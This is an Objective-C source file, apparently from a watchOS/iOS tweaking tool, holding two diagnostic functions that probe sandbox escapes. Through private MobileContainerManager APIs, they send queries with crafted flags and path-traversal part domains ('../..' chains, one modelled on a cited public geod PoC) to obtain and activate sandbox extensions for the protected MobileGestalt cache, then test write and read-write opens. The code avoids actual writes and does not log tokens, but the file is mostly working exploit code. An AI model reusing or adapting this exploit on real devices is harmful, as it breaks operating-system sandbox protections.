#import "BQPermissionDiagnostics.h"
#import "BQCore.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdbool.h>
#import <stdlib.h>
#import <string.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <unistd.h>

// Non-destructive METHOD TEST, manually triggered by user.
// Checks direct Class-13 queries and the distinct, file-scoped bad_query form
// from WorstGestalt. Tests effective write-open after token consumption.
// This file never calls write(), pwrite(), ftruncate(), unlink(), rename(),
// symlink(), or any cache rebuild function.

typedef void *(*BQWOCreate)(void);
typedef void (*BQWOSetNumber)(void *, uint64_t);
typedef void (*BQWOSetObject)(void *, void *);
typedef void (*BQWOSetPartDomain)(void *, const char *);
typedef void *(*BQWOResult)(void *);
typedef char *(*BQWOToken)(void *);
typedef void (*BQWOFree)(void *);
typedef void *(*BQWOXPCString)(const char *);
typedef void (*BQWOXPCRelease)(void *);
typedef int64_t (*BQWOConsume)(const char *);
typedef int64_t (*BQWORelease)(int64_t);
typedef int (*BQWOCheck)(pid_t, const char *, int, ...);

static NSString *BQWOOSBuild(void) {
    char version[128] = {0};
    size_t size = sizeof(version);
    if (sysctlbyname("kern.osversion", version, &size, NULL, 0) == 0)
        return [NSString stringWithUTF8String:version] ?: @"unknown";
    return @"unknown";
}

static NSString *BQWOOpenOnly(NSString *path) {
    errno = 0;
    int fd = open(path.fileSystemRepresentation, O_WRONLY | O_NOFOLLOW | O_CLOEXEC);
    int error = errno;
    if (fd < 0) {
        return [NSString stringWithFormat:@"DENIED errno=%d (%s)", error, strerror(error)];
    }
    close(fd);
    return @"ALLOWED (descriptor closed immediately, no data written)";
}

// Classify only known public extension-class labels; never export the
// raw sandbox token (it is a security-sensitive bearer capability).
static NSString *BQWOExtensionClass(const char *raw) {
    if (!raw) return @"NONE";
    if (strstr(raw, "com.apple.app-sandbox.read-write"))
        return @"com.apple.app-sandbox.read-write";
    if (strstr(raw, "com.apple.app-sandbox.read"))
        return @"com.apple.app-sandbox.read";
    if (strstr(raw, "com.apple.sandbox.system-group"))
        return @"com.apple.sandbox.system-group";
    return @"UNKNOWN (unrecognized or opaque token)";
}

static NSString *BQWOSandboxStatus(BQWOCheck check, NSString *path) {
    if (!check) return @"UNKNOWN: sandbox_check unavailable";
    errno = 0;
    int r = check(getpid(), "file-write-data", 1, path.fileSystemRepresentation);
    int error = errno;
    if (r == 0) return @"ALLOW";
    if (r > 0) return [NSString stringWithFormat:@"DENY (%d)", r];
    return [NSString stringWithFormat:@"ERROR (%d: %s)", error, strerror(error)];
}

static NSString *BQWOMetadata(NSString *path) {
    struct stat s = {0};
    errno = 0;
    if (lstat(path.fileSystemRepresentation, &s) != 0) {
        int e = errno;
        return [NSString stringWithFormat:@"unavailable (%d: %s)", e, strerror(e)];
    }
    return [NSString stringWithFormat:@"inode=%llu size=%lld mode=%#o mtime=%lld",
            (unsigned long long)s.st_ino,
            (long long)s.st_size,
            (unsigned)(s.st_mode & 07777),
            (long long)s.st_mtimespec.tv_sec];
}

NSString *BQRunKAMUI26WriteOpenTest(void) {
    NSMutableArray<NSString *> *out = [NSMutableArray arrayWithObjects:
        @"=== watchOS26: Class 13 direct + file-scoped write-open test v2 ===",
        @"Target: existing MobileGestalt.plist only.",
        @"NO symlinks, NO file creates, NO write() or cache modifications.",
        @"An allowed O_WRONLY alone does not prove safe persistent MG writes.",
        nil];

    NSString *path = BQMobileGestaltPath();
    NSString *before = BQWOMetadata(path);
    [out addObject:[NSString stringWithFormat:@"OS: %@ / build: %@", NSProcessInfo.processInfo.operatingSystemVersionString, BQWOOSBuild()]];
    [out addObject:[NSString stringWithFormat:@"Target: %@", path]];
    [out addObject:[NSString stringWithFormat:@"Metadata before: %@", before]];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        [out addObject:@"STOP: container manager library not loadable"];
        return [out componentsJoinedByString:@"\n"];
    }
    BQWOCreate create = (BQWOCreate)dlsym(mgr, "container_query_create");
    BQWOSetNumber setClass = (BQWOSetNumber)dlsym(mgr, "container_query_set_class");
    BQWOSetObject setIDs = (BQWOSetObject)dlsym(mgr, "container_query_set_group_identifiers");
    BQWOSetNumber setPart = (BQWOSetNumber)dlsym(mgr, "container_query_operation_set_part");
    BQWOSetNumber setFlags = (BQWOSetNumber)dlsym(mgr, "container_query_operation_set_flags");
    BQWOSetPartDomain setPartDomain = (BQWOSetPartDomain)dlsym(mgr, "container_query_operation_set_part_domain");
    if (!setPartDomain)
        setPartDomain = (BQWOSetPartDomain)dlsym(mgr, "container_query_set_part_domain");
    BQWOResult one = (BQWOResult)dlsym(mgr, "container_query_get_single_result");
    BQWOToken token = (BQWOToken)dlsym(mgr, "container_copy_sandbox_token");
    BQWOFree releaseQuery = (BQWOFree)dlsym(mgr, "container_query_free");
    BQWOXPCString string = (BQWOXPCString)dlsym(RTLD_DEFAULT, "xpc_string_create");
    BQWOXPCRelease xpcRelease = (BQWOXPCRelease)dlsym(RTLD_DEFAULT, "xpc_release");
    BQWOConsume consume = (BQWOConsume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    BQWORelease release = (BQWORelease)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    BQWOCheck check = (BQWOCheck)dlsym(RTLD_DEFAULT, "sandbox_check");
    void *sb = NULL;
    if (!check) {
        sb = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY | RTLD_LOCAL);
        if (sb) check = (BQWOCheck)dlsym(sb, "sandbox_check");
    }

    if (!(create && setClass && setIDs && setPart && setFlags && one && token &&
          releaseQuery && string && xpcRelease && consume && release)) {
        [out addObject:@"STOP: required MCM or sandbox APIs unavailable"];
    } else {
        [out addObject:[NSString stringWithFormat:@"Baseline policy=%@ write-open=%@",
                        BQWOSandboxStatus(check, path), BQWOOpenOnly(path)]];
        // WorstGestalt's distinct file-scoped backend uses flag 0x8000000000,
        // which is NOT the direct 0x800000000 token case. It supplies an
        // eight-parent part domain ending in the existing target file path.
        // The alternate /var form is a path alias, not another write target.
        NSString *varPath = path;
        if ([path hasPrefix:@"/private/var/"]) {
            varPath = [@"/var/" stringByAppendingString:
                [path substringFromIndex:@"/private/var/".length]];
        }
        NSString *parentSteps = @"../../../../../../../..";
        NSArray<NSDictionary<NSString *, id> *> *cases = @[
            @{@"name": @"KAMUI-direct", @"flags": @(0x8100000000ULL), @"domain": @"", @"file": path},
            @{@"name": @"watchOS26-direct-alternate", @"flags": @(0x0800000000ULL), @"domain": @"", @"file": path},
            @{@"name": @"WorstGestalt-file-var", @"flags": @(0x8000000000ULL),
              @"domain": [parentSteps stringByAppendingString:varPath], @"file": varPath},
            @{@"name": @"WorstGestalt-file-private-var", @"flags": @(0x8000000000ULL),
              @"domain": [parentSteps stringByAppendingString:path], @"file": path}
        ];
        for (NSDictionary<NSString *, id> *test in cases) {
            NSString *name = test[@"name"];
            NSString *domain = test[@"domain"];
            NSString *testFile = test[@"file"];
            uint64_t flags = [test[@"flags"] unsignedLongLongValue];
            [out addObject:[NSString stringWithFormat:@"\n[%@ flag=0x%llx]",
                            name, (unsigned long long)flags]];
            if (domain.length && !setPartDomain) {
                [out addObject:@"SKIP: part-domain symbol unavailable"];
                continue;
            }
            [out addObject:[NSString stringWithFormat:@"mode=%@ tested-file=%@",
                domain.length ? @"file-scoped part-domain" : @"direct SystemGroup", testFile]];
            void *q = create();
            if (!q) {
                [out addObject:@"query-create=FAILED"];
                continue;
            }
            void *group = string("systemgroup.com.apple.mobilegestaltcache");
            if (!group) {
                [out addObject:@"group-identifier=FAILED"];
                releaseQuery(q);
                continue;
            }
            setClass(q, 13);
            setIDs(q, group);
            setPart(q, 3);
            if (domain.length) setPartDomain(q, domain.UTF8String);
            setFlags(q, flags);
            xpcRelease(group);
            void *res = one(q);
            [out addObject:[NSString stringWithFormat:@"MCM result=%@", res ? @"YES" : @"NO"]];
            char *raw = res ? token(res) : NULL;
            [out addObject:[NSString stringWithFormat:@"token=%@", raw ? @"YES" : @"NO"]];
            [out addObject:[NSString stringWithFormat:@"token_class=%@", BQWOExtensionClass(raw)]];
            if (raw) {
                errno = 0;
                int64_t h = consume(raw);
                int err = errno;
                [out addObject:[NSString stringWithFormat:@"consume=%@",
                                h >= 0 ? @"SUCCESS" : [NSString stringWithFormat:@"FAILED errno=%d (%s)", err, strerror(err)]]];
                if (h >= 0) {
                    [out addObject:[NSString stringWithFormat:@"while consumed: policy=%@ write-open=%@",
                                    BQWOSandboxStatus(check, testFile), BQWOOpenOnly(testFile)]];
                    int64_t released = release(h);
                    [out addObject:[NSString stringWithFormat:@"release=%lld", (long long)released]];
                    [out addObject:[NSString stringWithFormat:@"after release: policy=%@",
                                    BQWOSandboxStatus(check, path)]];
                }
                free(raw);
            }
            releaseQuery(q);
        }
        [out addObject:@"\nA token, or even a consumed extension, is not a successful write-open."];
    }
    if (sb) dlclose(sb);
    dlclose(mgr);

    NSString *after = BQWOMetadata(path);
    [out addObject:[NSString stringWithFormat:@"\nMetadata after: %@", after]];
    [out addObject:[NSString stringWithFormat:@"Metadata unchanged=%@",
                    [before isEqualToString:after] ? @"YES" : @"NO/UNVERIFIABLE"]];
    [out addObject:@"No protected cache data was written by this method test."];
    NSString *report = [out componentsJoinedByString:@"\n"];
    NSError *error = nil;
    NSString *reportPath = [BQDocuments() stringByAppendingPathComponent:@"kamui26-write-open.txt"];
    if (![report writeToFile:reportPath atomically:YES
                  encoding:NSUTF8StringEncoding error:&error]) {
        report = [report stringByAppendingFormat:@"\nCould not save report: %@",
                  error.localizedDescription ?: @"unknown"];
    }
    NSLog(@"[KAMUI26WriteOpen]\n%@\n[/KAMUI26WriteOpen]", report);
    return report;
}


// MARK: - Exact externally documented geod MCM variant (23U95, opt-in).
// Unlike the existing BQCore.m fallback with twelve '..' components and
// sandbox_extension_consume(), this matches the public six-component class-12
// geod PoC's container-object activation API.
//
// This is a REAL AUTHORIZATION TEST, not a protected mutation. It calls
// open(O_RDWR|O_NOFOLLOW) and immediately closes the fd. It performs NO
// write/pwrite/truncate/unlink/rename/rebuild against protected files.
// Reference: https://github.com/0xjohnnydev/Geod-MCM-PoC

typedef void *(*BQWOObjectCopy)(void *);
typedef void (*BQWOObjectFree)(void *);
typedef const char *(*BQWOObjectPath)(void *);
typedef bool (*BQWOObjectActivate)(void *, bool);

static NSString *BQWOReadWriteOpenOnly(NSString *path) {
    errno = 0;
    int fd = open(path.fileSystemRepresentation, O_RDWR | O_NOFOLLOW | O_CLOEXEC);
    int failure = errno;
    if (fd < 0) {
        return [NSString stringWithFormat:@"DENIED errno=%d (%s)", failure, strerror(failure)];
    }
    close(fd);
    return @"ALLOWED: O_RDWR fd opened and immediately closed, NO BYTES WRITTEN";
}

NSString *BQRunGeodExactReadWriteOpenTest(void) {
    NSMutableArray<NSString *> *out = [NSMutableArray arrayWithObjects:
        @"=== watchOS 26.6.1 exact geod Class12 MCM O_RDWR check ===",
        @"Real container-object activation; NO PROTECTED DATA WRITES.",
        @"Matches public six-parent PoC (not old twelve-parent BQCore fallback).",
        nil];
    NSString *path = BQMobileGestaltPath();
    NSString *expectedDirectory = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *partDomain = @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *before = BQWOMetadata(path);
    NSString *build = BQWOOSBuild();
    [out addObject:[NSString stringWithFormat:@"Build=%@ OS=%@", build,
                    NSProcessInfo.processInfo.operatingSystemVersionString]];
    [out addObject:[NSString stringWithFormat:@"Protected before: %@", before]];
    if (![build isEqualToString:@"23U95"] ||
        NSProcessInfo.processInfo.operatingSystemVersion.majorVersion != 26 ||
        ![path.stringByDeletingLastPathComponent isEqualToString:expectedDirectory]) {
        [out addObject:@"STOP: this controlled test only supports exact Watch6,18 watchOS26.6.1 path and build"];
        return [out componentsJoinedByString:@"\n"];
    }

    void *manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!manager) {
        [out addObject:@"STOP: MCM dylib unavailable"];
        return [out componentsJoinedByString:@"\n"];
    }

    BQWOCreate create = (BQWOCreate)dlsym(manager, "container_query_create");
    BQWOSetNumber setClass = (BQWOSetNumber)dlsym(manager, "container_query_set_class");
    BQWOSetObject setIDs = (BQWOSetObject)dlsym(manager, "container_query_set_identifiers");
    BQWOSetNumber setFlags = (BQWOSetNumber)dlsym(manager, "container_query_operation_set_flags");
    BQWOSetNumber setPart = (BQWOSetNumber)dlsym(manager, "container_query_operation_set_part");
    BQWOSetPartDomain setDomain = (BQWOSetPartDomain)dlsym(manager, "container_query_operation_set_part_domain");
    BQWOResult one = (BQWOResult)dlsym(manager, "container_query_get_single_result");
    BQWOFree freeQuery = (BQWOFree)dlsym(manager, "container_query_free");
    BQWOObjectCopy copyObject = (BQWOObjectCopy)dlsym(manager, "container_object_copy");
    BQWOObjectFree freeObject = (BQWOObjectFree)dlsym(manager, "container_object_free");
    BQWOObjectPath objectPath = (BQWOObjectPath)dlsym(manager, "container_object_get_path");
    BQWOObjectActivate activate = (BQWOObjectActivate)dlsym(manager, "container_object_sandbox_extension_activate");
    BQWOXPCString makeString = (BQWOXPCString)dlsym(RTLD_DEFAULT, "xpc_string_create");
    BQWOXPCRelease releaseString = (BQWOXPCRelease)dlsym(RTLD_DEFAULT, "xpc_release");
    BQWOCheck sandbox = (BQWOCheck)dlsym(RTLD_DEFAULT, "sandbox_check");
    void *sandboxLibrary = NULL;
    if (!sandbox) {
        sandboxLibrary = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY | RTLD_LOCAL);
        if (sandboxLibrary) sandbox = (BQWOCheck)dlsym(sandboxLibrary, "sandbox_check");
    }

    [out addObject:[NSString stringWithFormat:@"MCM entrypoints: identifiers=%@ partDomain=%@ objectActivate=%@",
        setIDs ? @"YES" : @"NO", setDomain ? @"YES" : @"NO", activate ? @"YES" : @"NO"]];
    [out addObject:[NSString stringWithFormat:@"Baseline policy=%@; O_RDWR=%@",
        BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
    if (!(create && setClass && setIDs && setFlags && setPart && setDomain &&
          one && freeQuery && copyObject && freeObject && objectPath &&
          activate && makeString && releaseString)) {
        [out addObject:@"STOP: missing exact PoC API; do not substitute a different ABI"];
    } else {
        void *q = create();
        if (!q) {
            [out addObject:@"STOP: MCM query-create failed"];
        } else {
            void *identifier = makeString("com.apple.geod");
            if (!identifier) {
                [out addObject:@"STOP: unable to make geod identifier"];
            } else {
                setClass(q, 12);
                setIDs(q, identifier);
                setFlags(q, 0x8100000000ULL);
                setPart(q, 3);
                setDomain(q, partDomain.UTF8String);
                releaseString(identifier);
                void *borrowed = one(q);
                void *object = borrowed && copyObject ? copyObject(borrowed) : NULL;
                [out addObject:[NSString stringWithFormat:@"Class12 query result=%@", object ? @"YES" : @"NO"]];
                if (object) {
                    const char *rawPath = objectPath(object);
                    NSString *returned = rawPath ? [NSString stringWithUTF8String:rawPath] : @"";
                    NSString *resolved = returned.stringByStandardizingPath;
                    if ([resolved isEqualToString:@"/var"] || [resolved hasPrefix:@"/var/"]) {
                        resolved = [@"/private" stringByAppendingString:resolved];
                    }
                    BOOL exact = [resolved isEqualToString:expectedDirectory];
                    [out addObject:[NSString stringWithFormat:@"Returned-path matches target=%@", exact ? @"YES" : @"NO"]];
                    // Never activate a token unless it resolves to the intended
                    // exact target directory. No raw token is logged.
                    if (exact) {
                        BOOL active = activate(object, false);
                        [out addObject:[NSString stringWithFormat:@"container_object_activate=%@", active ? @"YES" : @"NO"]];
                        if (active) {
                            [out addObject:[NSString stringWithFormat:@"Activated policy=%@; actual O_RDWR=%@",
                                BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
                        }
                    }
                    freeObject(object); // revokes object-backed extension
                    [out addObject:[NSString stringWithFormat:@"After object release policy=%@; O_RDWR=%@",
                        BQWOSandboxStatus(sandbox, path), BQWOReadWriteOpenOnly(path)]];
                }
            }
            freeQuery(q);
        }
    }
    if (sandboxLibrary) dlclose(sandboxLibrary);
    dlclose(manager);
    NSString *after = BQWOMetadata(path);
    [out addObject:[NSString stringWithFormat:@"Protected after: %@", after]];
    [out addObject:[NSString stringWithFormat:@"Metadata unchanged=%@",
        [before isEqualToString:after] ? @"YES" : @"NO: REVIEW BEFORE REPEATING"]];
    [out addObject:@"Result can prove writable-descriptor authorization only, never a persistent MobileGestalt modification."];
    [out addObject:@"No protected bytes were modified or deleted."];
    NSString *report = [out componentsJoinedByString:@"\n"];
    NSString *reportPath = [BQDocuments() stringByAppendingPathComponent:@"geod-exact-open-only.txt"];
    NSError *error = nil;
    if (![report writeToFile:reportPath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
        report = [report stringByAppendingFormat:@"\nSAVE_FAILED=%@", error.localizedDescription];
    }
    NSLog(@"[GeodExactReadWriteOpen]\n%@\n[/GeodExactReadWriteOpen]", report);
    return report;
}
